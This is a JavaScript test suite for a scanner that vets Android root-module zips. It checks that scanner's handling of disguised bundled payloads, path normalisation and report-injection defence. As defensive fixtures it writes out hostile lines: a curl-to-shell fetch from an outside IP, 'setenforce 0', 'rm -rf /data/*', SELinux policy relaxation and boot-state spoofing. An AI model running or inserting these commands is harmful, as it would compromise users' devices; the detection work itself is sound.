  assert.equal(r1.revokedBundledRefs.length, 2, JSON.stringify(r1.revokedBundledRefs));

  // 同一个形状，但那个 .sh 不在包里（运行期才写出来）：解析不到 -> 照报 high，且不许承诺读过
  const ghost = makeModuleZip({ id: 'eval.t1ghost', files: [
    ['customize.sh', '#!/system/bin/sh\nsh $MODPATH/install.sh\n'],
  ]});
  const r2 = await scanToReport(ghost, { changeType: 'first' });
  assert.ok(r2.findings.some((f) => f.ruleId === 'EXEC_BUNDLED_FILE'),
    '包内不存在的引用仍然要人工读（fail-closed：多拦可申诉）');
  assert.equal(r2.riskLevel, 'high');

  // 后缀是 .sh 但内容是机器码（魔数赢过后缀）-> 它其实不在扫描面里 -> 必须报、必须升级
  const renamed = makeModuleZip({ id: 'eval.t1ren', files: [
    ['customize.sh', '#!/system/bin/sh\nsh $MODDIR/install.sh\n'],
    ['install.sh', Buffer.concat([Buffer.from('\x7fELF\x02\x01\x01\x00', 'latin1'),
      Buffer.from([0, 0]), Buffer.from('setenforce 0\n', 'utf8'), Buffer.alloc(200, 0)])],
  ]});
  const r3 = await scanToReport(renamed, { changeType: 'first' });
  assert.deepEqual(r3.escalated.map((e) => e.resolvedEntry), ['install.sh'],
    '同一个后缀，另一条假设（已扫过）不成立时必须升级');
  assert.ok(r3.findings.some((f) => f.ruleId === 'EXEC_BUNDLED_FILE'));
  assert.equal(r3.riskLevel, 'high');
});

test('EXEC_BUNDLED_FILE：规则要接进规则表、分类有中文标签、且 high 参与定级', () => {
  assert.ok(CONTENT_RULES.some((r) => r.id === 'EXEC_BUNDLED_FILE'),
    '不进 CONTENT_RULES 的话 scanContent 根本不会跑它，端到端等于没这条规则');
  assert.equal(RULES_BY_ID.EXEC_BUNDLED_FILE, EXEC_BUNDLED_FILE);
  assert.equal(EXEC_BUNDLED_FILE.severity, 'high');
  assert.equal(EXEC_BUNDLED_FILE.category, 'execution');
  const [f] = EXEC_BUNDLED_FILE.scan('service.sh', 'sh $MODDIR/x.dat');
  assert.equal(f.severity, 'high');
  assert.equal(f.ruleId, 'EXEC_BUNDLED_FILE');
  assert.equal(f.file, 'service.sh');
  assert.equal(f.line, 1);
  assert.equal(countsTowardRisk(f), true, 'high 必须参与定级，不能只提示');
});

test('resolveBundledTargets：只认包内真实存在、大小写原样、且不在扫描面里的条目', () => {
  const files = [
    { name: 'service.sh', content: '#!/system/bin/sh\nsh $MODDIR/x.dat\n' },
    { name: 'x.dat', content: 'echo one\n' },
    { name: 'X.DAT', content: 'echo case\n' },          // 大小写不同的另一份，不许被 fuzzy 命中
    { name: 'bin/y.dat', content: 'echo two\n' },       // 子目录相对路径
    { name: 'ghost.ref', content: 'sh $MODDIR/not-in-zip.dat\n' },
  ];
  const targets = [files[0]];
  const got = resolveBundledTargets(targets, files, 'eval.t1');
  assert.deepEqual(got.map((e) => e.name), ['x.dat'], '只返回包内存在且未被扫描的那一条');
  assert.equal(got[0].__from, 'service.sh', '要能指出是谁引用了它');
  assert.equal(got[0].__line, 2, '行号是引用行的行号，不是文件行号');
  assert.equal(got[0].__ref, 'sh $MODDIR/x.dat', '引用原文要留在报告里供人工复验');
  assert.equal(got[0].content, 'echo one\n', '升级条目必须带着内容，否则下面扫不到');

  // 已在扫描面里的不重复追加
  assert.deepEqual(resolveBundledTargets([targets[0], files[1]], files, 'eval.t1'), [],
    '已在扫描面里的条目不再取一次，否则同一份内容被扫两遍');
  // 「文本后缀就不再升级」这条旧判据已被评审 fix1-① 否掉：后缀不代表已扫过。
  // 换成看扫描面成员 —— helper.sh 真在扫描面里时不重复取，不在时（例如它是改名成 .sh 的机器码，
  // classify 把它落到 binaries）必须取进来。
  const realTargets = [{ name: 'service.sh', content: 'sh $MODDIR/helper.sh\n' },
    { name: 'helper.sh', content: 'rm -rf /data/*\n' }];
  assert.deepEqual(resolveBundledTargets(realTargets, realTargets, 'm').map((e) => e.name), [],
    '已在扫描面里的 .sh 不再取一次，否则同一份内容被扫两遍');
  const disguisedTargets = [{ name: 'service.sh', content: 'sh $MODDIR/helper.sh\n' }];
  const disguisedFiles = [...disguisedTargets, { name: 'helper.sh', content: 'rm -rf /data/*\n' }];
  assert.deepEqual(resolveBundledTargets(disguisedTargets, disguisedFiles, 'm').map((e) => e.name),
    ['helper.sh'], '后缀是 .sh 但确实不在扫描面里时，它就没被逐行扫过 —— 必须升级');
  // 指向别的模块目录的绝对路径不算包内条目
  const other = [{ name: 'service.sh', content: 'sh /data/adb/modules/other_mod/x.dat\n' }];
  assert.deepEqual(resolveBundledTargets(other, files, 'eval.t1'), [],
    '模块 id 不匹配时不许把 /data/adb/modules/<别的 id>/ 折进本包');
  // 引用了包内不存在的文件：不升级（那条引用由行级规则自己报）
  const ghost = [{ name: 'ghost.ref', content: files[4].content }];
  assert.deepEqual(resolveBundledTargets(ghost, files, 'eval.t1'), []);
  // 只递归一层：x.dat 自己的引用不再追随（防环，也把链路长度钉死在报告可读的范围）
  const chained = [
    { name: 'service.sh', content: 'sh $MODDIR/x.dat\n' },
    { name: 'x.dat', content: 'sh $MODDIR/bin/y.dat\n' },
    { name: 'bin/y.dat', content: 'echo deep\n' },
  ];
  assert.deepEqual(resolveBundledTargets([chained[0], chained[1]], chained, 'm').map((e) => e.name), ['bin/y.dat'],
    '一层升级：只从初始扫描面出发');
  assert.deepEqual(resolveBundledTargets([chained[0]], chained, 'm').map((e) => e.name), ['x.dat'],
    '从 service.sh 出发只到 x.dat，不再往下追');
});

test('端到端：被 sh 引用的伪装二进制照样进扫描面（这条压过「像不像文本」）', async () => {
  // 硬要求 3：载荷填成二进制样躲过文本判定是现成的逃逸阀，所以「被引用」这件事本身就够纳入。
  const zip = makeModuleZip({ id: 'eval.t1b', files: [
    ['service.sh', '#!/system/bin/sh\nsh $MODDIR/payload.bin\n'],
    ['payload.bin', Buffer.concat([Buffer.from('setenforce 0\n', 'utf8'), Buffer.from([0x00]),
      Buffer.from('curl http://45.77.1.2/x.sh | sh\n', 'utf8')])],
  ]});
  const r = await scanToReport(zip, { changeType: 'first' });
  assert.ok(r.binaries.some((b) => b.name === 'payload.bin'), '它确实先被 classify 认成二进制，才谈得上升级');
  assert.deepEqual(r.escalated.map((e) => e.resolvedEntry), ['payload.bin']);
  assert.equal(r.escalated[0].fromFile, 'service.sh');
  assert.equal(r.escalated[0].fromLine, 2);
  const ids = r.findings.map((f) => f.ruleId);
  assert.ok(ids.includes('EXEC_BUNDLED_FILE'), ids.join(','));
  const sel = r.findings.find((f) => f.ruleId === 'SELINUX_DISABLE');
  assert.ok(sel, '升级之后要真的按文本逐行扫过');
  assert.equal(sel.file, 'payload.bin');
  assert.equal(sel.line, 1);
  assert.ok(r.scripts.some((s) => s.name === 'payload.bin'), '升级条目要出现在人看得见的全文里');
  assert.ok(r.inventory.escalated.some((e) => e.name === 'payload.bin'), '也要出现在清单里');
  assert.equal(r.riskLevel, 'high');
});

test('端到端：引用的路径不在包内时不升级，但引用行本身照样报 high', async () => {
  // 分工：行级规则只管「脚本执行了模块目录里的另一个文件」，升级只认真实存在的条目。
  const zip = makeModuleZip({ id: 'eval.t1c', files: [
    ['service.sh', '#!/system/bin/sh\nsh $MODDIR/ghost.dat\n'],
  ]});
  const r = await scanToReport(zip, { changeType: 'first' });
  assert.deepEqual(r.escalated, [], '包内没有 ghost.dat，无内容可拉进扫描面');
  assert.deepEqual(r.inventory.escalated, []);
  assert.ok(!r.scripts.some((s) => s.name === 'ghost.dat'));
  const ids = r.findings.map((f) => f.ruleId);
  assert.ok(ids.includes('EXEC_BUNDLED_FILE'), ids.join(','));
  assert.equal(r.riskLevel, 'high', '运行期才出现的可执行目标同样要人工读');
});

test('端到端：升级链路在报告里看得见（escalated + inventory + Markdown 引用链）', async () => {
  // —— (a) 真升级那一格：载荷在 feed 之外（魔数头伪装成 .dat → binaries 桶），由 service.sh 的引用拉进来。
  // report.escalated 的语义就应该是这一格：「原本不在扫描面、因引用被拉进来的条目」。
  const binZip = makeModuleZip({ id: 'eval.t1dbin', files: [
    ['service.sh', '#!/system/bin/sh\nsh /data/adb/modules/eval.t1dbin/stage.dat\n'],
    ['stage.dat', elfWith('setenforce 0\n')],
  ]});
  const rb = await scanToReport(binZip, { changeType: 'first' });
  assert.deepEqual(rb.escalated, [
    { fromFile: 'service.sh', fromLine: 2, ref: 'sh /data/adb/modules/eval.t1dbin/stage.dat', resolvedEntry: 'stage.dat' },
  ]);
  assert.deepEqual(rb.inventory.escalated.map((e) => [e.name, e.fromFile, e.fromLine]), [['stage.dat', 'service.sh', 2]]);
  // 升级过的条目不再出现在「未纳入行级扫描的数据文件」里 —— 它已经被扫了
  assert.ok(!rb.inventory.otherFiles.includes('stage.dat'), JSON.stringify(rb.inventory.otherFiles));
  const mdb = renderMarkdown(rb);
  assert.match(mdb, /被脚本引用而\*\*升级进扫描面\*\*的条目/);
  assert.match(mdb, /stage\.dat/);
  assert.ok(mdb.includes('| 被引用升级（原本不在扫描面） | `stage.dat` |'), '文件清单表里也要有它一行');
  assert.match(mdb, /`service\.sh:2`/);
  assert.ok(rb.findings.some((f) => f.ruleId === 'SELINUX_DISABLE' && f.file === 'stage.dat'),
    '升级不是记账游戏：拉进来之后必须真被逐行读过：' + JSON.stringify(rb.findings.map((f) => f.ruleId)));
  const jb = JSON.parse(renderJSON(rb));
  assert.deepEqual(jb.escalated, rb.escalated, 'escalated 是报告字段，不是 finding，JSON 里原样保留');

  // —— (b) P11 那一格：载荷是名单外的**可读文本**，本来就在 feed 上，所以没有升级证人。
  // 少掉的只有「它曾被拉进来」这句记账，读到的东西一个字都没少：全文进了「逐行扫过的文件全文」，
  // 载荷内容自己出了 finding，引用方也仍然被 EXEC_BUNDLED_FILE/high 指名（covered 判在扩面之前的面）。
  const r = await scanToReport(makeModuleZip({ id: 'eval.t1d', files: [
    ['service.sh', '#!/system/bin/sh\nsh /data/adb/modules/eval.t1d/stage.dat\n'],
    ['stage.dat', 'curl http://45.77.1.2/x.sh | sh\n'],
  ]}), { changeType: 'first' });
  assert.deepEqual(r.escalated, [],
    'stage.dat 已经在 feed 上：escalated 只记「原本不在扫描面」的条目，不许为它作伪证');
  assert.deepEqual(r.inventory.escalated, [], '清单里的升级行同理，不许凭空多一笔');
  assert.ok(!r.inventory.otherFiles.includes('stage.dat'), JSON.stringify(r.inventory.otherFiles));
  assert.ok(r.scripts.some((s) => s.name === 'stage.dat'),
    '载荷必须在被逐行扫过的文件里：' + JSON.stringify(r.scripts.map((s) => s.name)));
  const md = renderMarkdown(r);
  assert.match(md, /## 逐行扫过的文件全文[\s\S]*curl http:\/\/45\.77\.1\.2\/x\.sh \| sh/);
  assert.ok(r.findings.some((f) => f.ruleId === 'PIPE_TO_SHELL' && f.file === 'stage.dat' && f.severity === 'high'),
    '载荷的内容必须真被读到并出发现：' + JSON.stringify(r.findings.map((f) => `${f.ruleId}/${f.severity}`)));
  const eb = r.findings.find((f) => f.ruleId === 'EXEC_BUNDLED_FILE');
  assert.equal(eb && eb.severity, 'high',
    '作证的角色落在 EXEC_BUNDLED_FILE 自己身上：它必须还在、还是 high');
  assert.equal(r.riskLevel, 'high');
  assert.equal(r.decision.action, 'block');
});

/** ELF 头 + 埋一行明文给行级规则读 + 补零：魔数是机器码，名字随用例挑 */
function elfWith(text, pad = 200) {
  return Buffer.concat([Buffer.from('\x7fELF\x02\x01\x01\x00', 'latin1'), Buffer.from([0, 0]),
    Buffer.from(text, 'utf8'), Buffer.alloc(pad, 0)]);
}

/**
 * 按 CommonMark/GitHub 语义走一遍 Markdown，返回落在代码围栏「之外」的标题行。
 * 开栏长度 n，只有整行反引号数 >= n 才闭栏 —— 围栏体内的一切都不参与渲染。
 */
function headingsOutsideFence(md) {
  let fence = 0;
  const out = [];
  for (const line of String(md).split(/\r?\n/)) {
    const m = line.match(/^ {0,3}(`{3,})([^`]*)$/);
    if (m) {
      if (fence === 0) fence = m[1].length;
      else if (m[1].length >= fence) fence = 0;
      continue;
    }
    if (fence === 0 && /^#{1,6}\s/.test(line)) out.push(line);
  }
  return out;
}

test('fix1-①：改名成 .js / .sh 的 ELF 被 sh 引用时闸不再静默失效（升级 + 逐行扫 + high）', async () => {
  for (const name of ['payload.js', 'payload.sh']) {
    const zip = makeModuleZip({ id: 'eval.h1', files: [
      ['service.sh', '#!/system/bin/sh\nsh $MODDIR/' + name + '\n'],
      [name, elfWith('setenforce 0\n')],
    ]});
    const r = await scanToReport(zip, { changeType: 'first' });
    const ids = r.findings.map((f) => f.ruleId);
    assert.ok(r.binaries.some((b) => b.name === name), 'classify 认它是二进制（魔数赢过后缀）');
    assert.deepEqual(r.escalated.map((e) => e.resolvedEntry), [name], '评审实测 escalated 曾是 []');
    const sel = r.findings.find((f) => f.ruleId === 'SELINUX_DISABLE');
    assert.ok(sel, '该内容必须进行级扫描（评审实测一行都没扫）');
    assert.equal(sel.file, name);
    assert.equal(sel.line, 1);
    assert.ok(ids.includes('EXEC_BUNDLED_FILE'), ids.join(','));
    assert.equal(r.riskLevel, 'high', '评审实测这里曾只有 medium');
    assert.equal(r.decision.action, 'block');
  }
});

test('fix1-②：同一行不许自我豁免 —— 两个引用一个合法一个恶意，恶意那个必须报', async () => {
  for (const ref of [
    'sh $MODDIR/payload.dat && sh $MODDIR/install.sh',
    'sh $MODDIR/install.sh && sh $MODDIR/payload.dat',
    'sh $MODDIR/payload.dat  # 这行只是调用 install.sh 的包装',
  ]) {
    const zip = makeModuleZip({ id: 'eval.h2', files: [
      ['service.sh', '#!/system/bin/sh\n' + ref + '\n'],
      ['install.sh', 'echo install\n'],
      ['payload.dat', 'curl http://45.77.1.2/x.sh | sh\n'],
    ]});
    const r = await scanToReport(zip, { changeType: 'first' });
    const ids = r.findings.map((f) => f.ruleId);
    // Task 2.7（fix10-P11）：payload.dat 是名单外的可读文本，现在本来就在 feed 上 —— 它不再「被拉进来」，
    // 所以 escalated 空是正确结果。这条用例的证人换了落点：载荷自己的 PIPE_TO_SHELL/high 与引用方的
    // EXEC_BUNDLED_FILE/high 都还在（covered 判在扩面之前的五个桶上，撤销不成立）。
    assert.deepEqual(r.escalated, [], ref + ' —— payload.dat 已在 feed 上，不许再记一笔升级证人');
    assert.ok(r.scripts.some((s) => s.name === 'payload.dat'),
      ref + ' —— 载荷必须被逐行扫过：' + JSON.stringify(r.scripts.map((s) => s.name)));
    assert.ok(ids.includes('EXEC_BUNDLED_FILE'), ref);
    assert.ok(ids.includes('PIPE_TO_SHELL'), '载荷必须按文本再扫一遍');
    assert.equal(r.findings.find((f) => f.ruleId === 'PIPE_TO_SHELL').file, 'payload.dat');
    assert.equal(r.riskLevel, 'high', ref + ' —— 评审实测曾是 0 命中 / low');
    // install.sh 已被逐行扫过，不该由它说话：snippet 要指向真正没被扫过的载荷。
    // ↓ 这一条在本轮**保持红**，等一个代码侧决定，不许靠改断言变绿（详见 task-2.7-report.md 的停手项）：
    //   applyBundledRefVerdicts 的 `cause` 只认「被升级的 > 钉不住的 > 解析不到的」三种落点，
    //   P11 之后载荷已在 feed 上、没有升级条目 ⇒ cause 为空 ⇒ snippet 退回规则自己的最左匹配，
    //   于是第二种写法（良性引用在最左）把报告指到了 install.sh 上。判据、等级、结论都没松，
    //   松的是「谁为这条 high 作证」的指向。
    assert.match(r.findings.find((f) => f.ruleId === 'EXEC_BUNDLED_FILE').snippet, /payload\.dat/);
  }
});

test('fix1-③：升级进来的非文本条目只给有界预览，机器码不进全文与产物', async () => {
  const blob = Buffer.concat([Buffer.from('\x7fELF\x02\x01\x01\x00', 'latin1'), Buffer.alloc(1024 * 1024, 0)]);
  const zip = makeModuleZip({ id: 'eval.h3', files: [
    ['service.sh', '#!/system/bin/sh\nsh $MODDIR/payload.conf\n'],
    ['payload.conf', blob],
  ]});
  const r = await scanToReport(zip, { changeType: 'first' });
  assert.deepEqual(r.escalated.map((e) => e.resolvedEntry), ['payload.conf'],
    '扫描面与渲染面分开：不许为了渲染方便把它退回名单外');
  const row = r.scripts.find((s) => s.name === 'payload.conf');
  assert.ok(row, '它还得在人看得见的清单里（F11）');
  assert.equal(row.nonText, true);
  assert.equal(row.contentKind, 'non-text-preview');
  assert.ok(row.nulCount > 100000, '预览要报出 NUL 个数，实际 ' + row.nulCount);
  assert.ok(!row.content.includes('\u0000'), '正文里不许有 NUL');
  assert.ok(row.content.length < 1000, '必须是有限预览，实际 ' + row.content.length + ' 字符');
  assert.match(row.content, /内容非文本/);
  assert.match(row.content, /7f 45 4c 46/);
  const md = renderMarkdown(r);
  const json = renderJSON(r);
  assert.ok(Buffer.byteLength(md) < 32 * 1024, 'md 曾被灌成 1.03 MB，实际 ' + Buffer.byteLength(md) + ' B');
  assert.ok(!md.includes('\u0000'), 'md 曾被灌成 52 万个 NUL');
  assert.ok(Buffer.byteLength(json) < 64 * 1024, 'json 曾被灌成 50 MB，实际 ' + Buffer.byteLength(json) + ' B');
  assert.match(md, /非文本：只给有界预览/);
});

test('fix1-③：围栏体里的反引号关不掉公开评论的围栏 —— 投稿者写的假标题不外漏', async () => {
  const evil = '#!/system/bin/sh\nsh $MODDIR/tool.bin\n```\n\n## 已由维护者批准 ✅\n\n无需人工复核\n````\n';
  const zip = makeModuleZip({ id: 'eval.h3b', files: [
    ['service.sh', evil],
    ['tool.bin', elfWith('setenforce 0\n')],
  ]});
  const r = await scanToReport(zip, { changeType: 'first' });
  const md = renderMarkdown(r);
  const outside = headingsOutsideFence(md);
  assert.ok(!outside.some((l) => l.includes('已由维护者批准')),
    '注入的假标题被当成报告自己的标题渲染了：' + JSON.stringify(outside.slice(0, 8)));
  // 开栏/闭栏的长度要压过正文里最长的反引号串（这里是 4 个），否则正文的 ``` 能提前闭栏
  const opener = md.match(/^(`{3,})sh$/m);
  assert.ok(opener, '「逐行扫过的文件全文」一节要有以 sh 标注的开栏');
  assert.ok(opener[1].length > 4,
    '开栏长度必须压过正文里最长的反引号串，实际 ' + opener[1].length + ' 个');
  assert.ok(md.includes('## 已由维护者批准'), '显示层防护不许吃掉原文（人工要看的就是原文）');
});

test('fix1-④：注释行豁免；echo / source / 单引号 / ${IFS} / 直接执行一律不许豁免', async () => {
  // 注释里的引用不是执行 —— 按本仓 /^\s*#/ 的既有先例不报 high（评审实测它曾报 high，是误伤）。
  const commented = makeModuleZip({ id: 'eval.h4a', files: [
    ['service.sh', '#!/system/bin/sh\n# sh $MODDIR/notes.dat\nexit 0\n'],
    ['notes.dat', 'echo documented\n'],
  ]});
  const a = await scanToReport(commented, { changeType: 'first' });
  assert.ok(!a.findings.some((f) => f.ruleId === 'EXEC_BUNDLED_FILE'),
    JSON.stringify(a.findings.map((f) => f.ruleId)));
  assert.equal(a.riskLevel, 'low', JSON.stringify(a.findings));
  // Task 2.7（fix10-P11）：notes.dat 是名单外的可读文本，本来就在 feed 上，不再有升级证人。
  // 「豁免只作用于报不报、被引用的条目照样要读」这条主张换到它真正的落点上：它在被逐行扫过的那份里。
  assert.ok(a.scripts.some((s) => s.name === 'notes.dat'),
    '注释行豁免不许让 notes.dat 免检：它必须被逐行扫过 —— ' + JSON.stringify(a.scripts.map((s) => s.name)));
  assert.deepEqual(a.escalated, [], 'notes.dat 已在 feed 上：不许为它记一笔没发生过的升级');

  for (const [line, want] of [
    ['echo hi sh $MODDIR/x.dat', 'x.dat'],
    ['. $MODDIR/functions', 'functions'],
    ["sh '$MODDIR/lib.dat'", 'lib.dat'],
    ['sh${IFS}$MODDIR/x.bin', 'x.bin'],
    ['$MODDIR/tool.bin', 'tool.bin'],
    ['do_thing || $MODDIR/stage2.bin', 'stage2.bin'],
  ]) {
    const zip = makeModuleZip({ id: 'eval.h4b', files: [
      ['service.sh', '#!/system/bin/sh\n' + line + '\n'],
      [want, 'echo payload\n'],
    ]});
    const r = await scanToReport(zip, { changeType: 'first' });
    assert.ok(r.findings.some((f) => f.ruleId === 'EXEC_BUNDLED_FILE'), line + ' 必须报');
    // Task 2.7（fix10-P11）：这些载荷都是可读文本，本来就在 feed 上 → 没有升级证人，但必须真被读过。
    assert.ok(r.scripts.some((s) => s.name === want),
      line + ' 必须把 ' + want + ' 读掉：' + JSON.stringify(r.scripts.map((s) => s.name)));
    assert.deepEqual(r.escalated, [], line + ' —— ' + want + ' 已在 feed 上，不许记没发生过的升级');
    assert.equal(r.riskLevel, 'high', line);
  }
});

test('fix1-⑤：归一化覆盖 //、..、.、反斜杠、大小写变体', async () => {
  assert.equal(normalizeRefPath('sub/../x.dat'), 'x.dat');
  assert.equal(normalizeRefPath('sub/./x.dat'), 'sub/x.dat');
  assert.equal(normalizeRefPath('//x.dat'), 'x.dat');
  assert.equal(normalizeRefPath('sub\\..\\x.dat'), 'x.dat');
  assert.equal(normalizeRefPath('../escape.dat'), null, '上跳越出模块根目录的不算包内条目');

  for (const [line, want] of [
    ['sh $MODDIR//norm.dat', 'norm.dat'],
    ['sh $MODDIR/sub/../norm.dat', 'norm.dat'],
    ['sh $MODDIR/./norm.dat', 'norm.dat'],
    ['sh $MODDIR\\sub\\inner.dat', 'sub/inner.dat'],
    ['sh $MODDIR/NORM.DAT', 'norm.dat'],
  ]) {
    const zip = makeModuleZip({ id: 'eval.h5', files: [
      ['service.sh', '#!/system/bin/sh\n' + line + '\n'],
      ['norm.dat', 'setenforce 0\n'],
      ['sub/inner.dat', 'setenforce 0\n'],
    ]});
    const r = await scanToReport(zip, { changeType: 'first' });
    // Task 2.7（fix10-P11）：归一化指向的 .dat 现在本来就在 feed 上，所以没有升级证人；
    // 「归一化之后要真的把那个条目读了」这条主张由下面 SELINUX_DISABLE 那句钉着，一件没少。
    assert.ok(r.scripts.some((s) => s.name === want),
      line + ' 归一化后的 ' + want + ' 必须在被逐行扫过的文件里：'
      + JSON.stringify(r.scripts.map((s) => s.name)));
    assert.deepEqual(r.escalated, [], line + ' —— ' + want + ' 已在 feed 上，不许记没发生过的升级');
    const f = r.findings.find((x) => x.ruleId === 'EXEC_BUNDLED_FILE');
    assert.equal(f.advice, EXEC_BUNDLED_FILE.advice, '解析到并读过了，才允许保留「读一遍」那句承诺');
    assert.ok(r.findings.some((x) => x.ruleId === 'SELINUX_DISABLE' && x.file === want),
      '归一化之后要真的把那个条目读了：' + line);
  }
});

test('fix1-⑤：归一化后仍解析不到时，报告不许承诺它没做到的事', async () => {
  for (const line of ['sh $MODDIR/ghost.dat', 'sh $MODDIR/../escape.dat', 'sh $MODDIR/$SUB/x.dat']) {
    const zip = makeModuleZip({ id: 'eval.h5b', files: [
      ['service.sh', '#!/system/bin/sh\n' + line + '\n'],
      ['x.dat', 'setenforce 0\n'],
    ]});
    const r = await scanToReport(zip, { changeType: 'first' });
    assert.deepEqual(r.escalated, [], line + ' 解析不到条目，不该假装升级');
    const f = r.findings.find((x) => x.ruleId === 'EXEC_BUNDLED_FILE');
    assert.ok(f, line + ' 仍要报（fail-closed：多拦可申诉）');
    assert.equal(f.advice, EXEC_UNRESOLVED_ADVICE);
    assert.ok(!f.advice.includes('读一遍'), '不许在报告里说「把那个文件也读一遍」而实际没读');
    assert.equal(r.riskLevel, 'high', line);
  }
});

test('fix1-⑥：同一载荷被多种写法引用只升级一次；同名不同内容的重复条目全都要扫', async () => {
  // Task 2.7（fix10-P11）把「升级证人」和「读没读」分成了两格：
  //   * 可读文本载荷（.dat）现在本来就在 feed 上 → escalated 必须是空，去重要看 scripts 里出现几行；
  //   * feed 之外的载荷（魔数头伪装成 .dat → binaries）仍然只能靠引用被拉进来 → 原来那三条去重
  //     断言一字不动地钉在它身上。
  // 两格都跑，是因为这条用例真正要钉的是「同一个内容只进扫描面一次 / 不同内容都要进」，
  // 而不是「escalated 里必须有东西」。
  const REF3 = '#!/system/bin/sh\nsh $MODDIR/payload.dat\nsh $MODDIR//payload.dat\nbash ${MODDIR}/payload.dat\n';

  // —— (a) 可读文本：三种写法指向同一份内容，feed 里只能有一份
  const a = await scanToReport(makeModuleZip({ id: 'eval.h6a', files: [
    ['service.sh', REF3],
    ['payload.dat', 'echo one\n'],
  ]}), { changeType: 'first' });
  assert.deepEqual(a.escalated, [], 'payload.dat 已在 feed 上：不许记一笔没发生过的升级');
  assert.equal(a.scripts.filter((s) => s.name === 'payload.dat').length, 1,
    '三种写法指向同一份内容，被逐行扫过的清单里只能有一行：'
    + JSON.stringify(a.scripts.map((s) => s.name)));

  // —— (a-bin) 同形状，载荷换成 feed 之外的二进制：原三条升级断言一字不动
  const ab = await scanToReport(makeModuleZip({ id: 'eval.h6abin', files: [
    ['service.sh', REF3],
    ['payload.dat', elfWith('echo one\n')],
  ]}), { changeType: 'first' });
  assert.equal(ab.escalated.length, 1, '三种写法指向同一份内容，扫描面里只能有一份');
  assert.equal(ab.scripts.filter((s) => s.name === 'payload.dat').length, 1);
  assert.equal(ab.inventory.escalated.length, 1);

  // —— (b) 同名不同内容的文本重复：两份都得被读到，否则「放两份同名、审核读干净那份」就成立了
  const b = await scanToReport(makeModuleZip({ id: 'eval.h6b', files: [
    ['service.sh', '#!/system/bin/sh\nsh $MODDIR/dup.dat\n'],
    ['dup.dat', 'setenforce 0\n'],
    ['dup.dat', 'curl http://45.77.1.2/x.sh | sh\n'],
  ]}), { changeType: 'first' });
  assert.equal(b.scripts.filter((s) => s.name === 'dup.dat').length, 2,
    '同名不同内容的两份都要被逐行扫过：' + JSON.stringify(b.scripts.map((s) => s.name)));
  assert.deepEqual(b.escalated, [], '两份都已在 feed 上：没有升级证人，但两条内容都读到了');
  const ids = b.findings.map((f) => f.ruleId);
  assert.ok(ids.includes('SELINUX_DISABLE') && ids.includes('PIPE_TO_SHELL'), ids.join(','));
  assert.ok(ids.includes('STRUCT_DUPLICATE_NAME'), ids.join(','));

  // —— (b-bin) 同形状换成 feed 之外：原「两份都要升级」的断言一字不动
  const bb = await scanToReport(makeModuleZip({ id: 'eval.h6bbin', files: [
    ['service.sh', '#!/system/bin/sh\nsh $MODDIR/dup.dat\n'],
    ['dup.dat', elfWith('setenforce 0\n')],
    ['dup.dat', elfWith('curl http://45.77.1.2/x.sh | sh\n')],
  ]}), { changeType: 'first' });
  assert.deepEqual(bb.escalated.map((e) => e.resolvedEntry), ['dup.dat', 'dup.dat'],
    '同名不同内容的两份都要升级；去重只去「内容相同」的那一类');

  // —— (c) 同名同内容的文本重复：扩面之后两份都在 feed 上（比 BASE 多读了一遍，不松），
  // 「同内容只算一份」的去重由 feed 之外的 (c-bin) 钉住。
  const c = await scanToReport(makeModuleZip({ id: 'eval.h6c', files: [
    ['service.sh', '#!/system/bin/sh\nsh $MODDIR/same.dat\nsh $MODDIR//same.dat\n'],
    ['same.dat', 'echo same\n'],
    ['same.dat', 'echo same\n'],
  ]}), { changeType: 'first' });
  assert.equal(c.scripts.filter((s) => s.name === 'same.dat').length, 2,
    '同名同内容的可读文本现在两份都进 feed（BASE 上一份都没读，只有引用时才升级一份）：'
    + JSON.stringify(c.scripts.map((s) => s.name)));
  assert.deepEqual(c.escalated, [], '它们本来就在 feed 上：escalated 里不许出现');

  // —— (c-bin) 内容完全相同的重复条目只扫一遍，别把产物灌两遍
  const cb = await scanToReport(makeModuleZip({ id: 'eval.h6cbin', files: [
    ['service.sh', '#!/system/bin/sh\nsh $MODDIR/same.dat\nsh $MODDIR//same.dat\n'],
    ['same.dat', elfWith('echo same\n')],
    ['same.dat', elfWith('echo same\n')],
  ]}), { changeType: 'first' });
  assert.equal(cb.escalated.length, 1, '同名的两份同内容条目算一份，扫描面里不许出现两遍');
  assert.equal(cb.scripts.filter((s) => s.name === 'same.dat').length, 1,
    '同上：被逐行扫过的清单里也只许一行：' + JSON.stringify(cb.scripts.map((s) => s.name)));
});

test('fixtures：干净模块带 changeType: first 仍可自动放行，不带 opts 则不可达（F15）', async () => {
  const clean = makeModuleZip({ id: 'eval.clean', files: [['service.sh', CLEAN_SH]] });
  const withOpts = await scanToReport(clean, { changeType: 'first' });
  assert.equal(withOpts.meta.id, 'eval.clean', 'makeModuleZip 必须自带 module.prop，否则 id 解析不到');
  assert.equal(withOpts.riskLevel, 'low', JSON.stringify(withOpts.findings));
  assert.equal(withOpts.decision.action, 'auto-approve');
  assert.deepEqual(withOpts.escalated, [], '干净模块不该有升级条目');
  assert.ok(!withOpts.findings.some((f) => f.ruleId === 'EXEC_BUNDLED_FILE'),
    CLEAN_SH + ' 里的 `cp -f busybox $MODPATH/...` 不是执行别的文件');

  // 同一个包不带 opts：changeType 落到 unknown，low+unknown 只能是 request-review。
  // 这条断言是留着提醒回归表：scanToReport(zip) 这个形状下「干净模块自动放行」永远测不到。
  const bare = await scanToReport(clean);
  assert.equal(bare.changeType, 'unknown');
  assert.equal(bare.decision.action, 'request-review');
  assert.equal(bare.riskLevel, 'low');

  assert.match(moduleProp('eval.x'), /^id=eval\.x$/m);
});

// ---------------------------------------------------------------------------
// ⑧ root 提权语义（T2：sepolicy.rule/.rc/.te/shebang 无后缀进扫描面 + 5 条新规则）
// ---------------------------------------------------------------------------

// —— 简报 Step 1 原文，四条各一条，全用实测原句 ——
const ROOT_CASES = [
  ['sepolicy.rule', 'allow su * fs:file { read write open execute };\n', 'SELINUX_POLICY_RELAX'],
  ['service.sh', 'magiskpolicy --live "allow su * *"\n', 'MAGISK_POLICY_LIVE'],
  ['service.sh', 'resetprop -w ro.boot.verifiedbootstate green\n', 'VERIFIED_BOOT_SPOOF'],
  ['service.sh', 'resetprop -w ro.debuggable 1\n', 'DEBUGGABLE_ENABLE'],
];
for (const [name, body, ruleId] of ROOT_CASES) {
  test(`${ruleId}：${name} 命中且判 high/medium 正确`, async () => {
    const r = await scanToReport(makeModuleZip({ id: 'eval.t2', files: [['module.prop', moduleProp('eval.t2')], [name, body]] }));
